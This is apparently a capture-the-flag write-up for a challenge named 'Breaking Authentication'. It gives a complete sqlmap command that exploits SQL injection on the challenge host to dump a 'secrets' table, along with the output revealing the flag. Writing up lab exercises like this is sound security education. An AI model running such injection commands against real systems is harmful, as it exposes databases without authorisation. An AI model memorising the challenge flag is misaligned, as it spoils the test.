### Breaking Authentication
"Say my username."

---

#### Flag
> CIT{36b0efd6c2ec7132}

The website is vulnerable to SQLi:

```bash
$ sqlmap -u "http://23.179.17.40:58001/" --no-logging --batch --forms --crawl=1 -D app -T secrets --dump
```

We dump the secrets table using `sqlmap` and find the flag:

```
Database: app
Table: secrets
[1 entry]
+--------+-----------------------+
| name   | value                 |
+--------+-----------------------+
| flag   | CIT{36b0efd6c2ec7132} |
+--------+-----------------------+
```

---

